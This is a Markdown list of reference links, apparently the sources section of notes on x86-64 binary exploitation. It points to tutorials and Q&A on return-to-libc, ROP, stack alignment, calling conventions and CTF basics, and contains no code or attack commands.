* [**ret2prop.blogspot.com-return to libc**](https://ret2rop.blogspot.com/2018/08/return-to-libc.html)<br>
 
* [**research.csiro.au-Debugging Stories Stack Alignment Matters**](https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/)<br>
 
* [**stackoverflow.com-Libc System When The Stack Pointer Is Not 16 Padded Causes Segmentation Fault**](https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul)<br> 
 
* [**Why Does the x86_64 Amd64 System V ABI Mandate a 16 Byte Stack Alignment**](https://stackoverflow.com/questions/49391001/why-does-the-x86-64-amd64-system-v-abi-mandate-a-16-byte-stack-alignment)<br>

* [**valsamaras.medium.com-Introduction to X64 Binary Exploitation Part-2**](https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465)<br>

* [**crypto.stanford.edu-Rop**](https://crypto.stanford.edu/~blynn/asm/rop.html)

* [**Image-Memory Hiearchy**](https://ace315dc-a-62cb3a1a-s-sites.googlegroups.com/site/cachememory2011/memory-hierarchy/hei.png?attachauth=ANoY7crqddm97fViorOVc7ytOnK_jH4jmrRj2dDh9NENJBbf5lbb6K_gsQMxWa-FR23COMxOMGmY7MdP54qTiJBIrCHlox_Y9MmQxooP2EAfagtz7zCoy1p6dFMwwz9lgDjdylZzdjPyUnBLtgp0VPeI18BSyI_TxStd_8sYOrpLduVLKWDyZ1cOo9_F67dkP_-D82KoM5Gww7cuIQvLchnERzRr962YRZ-pTfV9yoA3mEsaA1tmDGY%3D&attredirects=0)

* [**ref.x86asm.net-Coder64**](http://ref.x86asm.net/coder64.html)

* [**isss.io-Resource**](https://www.isss.io/resources)

* [**ctf101.org-Binary Exploitation Overview**](https://ctf101.org/binary-exploitation/overview/)

* [**wikipedia-Calling Convention x86_64**](https://en.wikipedia.org/wiki/Calling_convention#x86-64)

* [**man7.org-libc**](https://man7.org/linux/man-pages/man7/libc.7.html)
